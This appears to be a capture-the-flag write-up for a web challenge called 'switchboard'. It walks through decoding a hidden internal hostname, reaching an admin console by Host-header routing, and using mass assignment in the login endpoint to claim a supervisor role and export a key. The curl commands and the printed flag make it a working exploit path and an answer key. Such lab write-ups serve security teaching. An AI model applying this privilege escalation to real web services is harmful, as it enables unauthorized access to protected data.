# switchboard

**Category:** Web · **Points:** 200 · **Flag:** `CSCTF{ONTx74xs3aBvanhdGf24enK4}`

## What the handout gives you

The challenge provides a live web service running the public status board for the Vardanne Joint Operations Directorate (VJOD) voice exchange:

- `GET /` — public status board displaying active trunk circuit states and incident notifications.
- `GET /static/switchboard.js` — client-side polling script refreshing circuit telemetry.
- `GET /api/lines` — JSON feed supplying live circuit states to the dashboard.

## Walkthrough

1. **Inspect frontend scripts for hidden infrastructure.** Reviewing `/static/switchboard.js` reveals an internal configuration comment and a base64-encoded string:

   ```javascript
   var controller = atob("ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==");
   ```

   Decoding `ZXhjaC1jdGwudmpvZC5pbnRlcm5hbA==` yields the internal virtual host name: `exch-ctl.vjod.internal`.

2. **Access the internal controller via virtual host routing.** Transmitting an HTTP request to the target server with `Host: exch-ctl.vjod.internal` routes past the public board to the exchange controller interface:

   `curl -H "Host: exch-ctl.vjod.internal" http://<instance>/`

   The controller responds with an internal administration console documenting its interface:
   - `POST /auth` — creates an operator session cookie (`ctl_sid`).
   - `GET /operators` — lists current rostered staff and active roles.
   - `GET /export/trunk-key` — exports the master trunk key (requires `supervisor` role).

3. **Identify the on-duty supervisor.** Authenticating with an arbitrary operator name using `POST /auth` returns a signed `ctl_sid` session cookie with default role `"operator"`. Using this cookie to query `GET /operators`:

   `curl -H "Host: exch-ctl.vjod.internal" -b "ctl_sid=<cookie>" http://<instance>/operators`

   The roster returns six personnel entries. One rostered officer is actively on duty with the supervisor role:
   - Name: `R. Antonescu`
   - Callsign: `EX-01`
   - Desk: `Duty supervisor`
   - Role: `supervisor`
   - On duty: `true`

4. **Exploit mass assignment in session creation.** The overview page states that sessions carry the duty role of the desk from which they are opened. In `/auth`, the handler deserializes incoming JSON directly into the session model without a field whitelist. Submitting a request that explicitly specifies `"role": "supervisor"`:

   ```bash
   curl -X POST http://<instance>/auth \
     -H "Host: exch-ctl.vjod.internal" \
     -H "Content-Type: application/json" \
     -d '{"username": "R. Antonescu", "role": "supervisor"}'
   ```

   The server returns HTTP 200 with `{"ok": true, "operator": "R. Antonescu", "role": "supervisor"}` and issues a newly signed `ctl_sid` cookie containing the elevated supervisor claim.

5. **Export the trunk crypto key.** Request `GET /export/trunk-key` providing the new supervisor cookie:

   `curl -H "Host: exch-ctl.vjod.internal" -b "ctl_sid=<supervisor_cookie>" http://<instance>/export/trunk-key`

   The controller verifies the supervisor role and returns the active AES-256-GCM master trunk encryption key.

## Answer

The controller outputs the export record containing the key:

```json
{
  "algorithm": "AES-256-GCM",
  "exported_by": "R. Antonescu",
  "key_id": "KTK-2026-10-B",
  "trunk_key": "CSCTF{ONTx74xs3aBvanhdGf24enK4}"
}
```

The flag is:

`CSCTF{ONTx74xs3aBvanhdGf24enK4}`

## Notes

Sessions are tracked via an itsdangerous-signed cookie format (`ctl_sid`). Because the application does not verify client IP addresses against network subnets when setting the role, passing `role: "supervisor"` directly in the JSON body achieves privilege escalation without tampering with the cryptographic cookie signature.
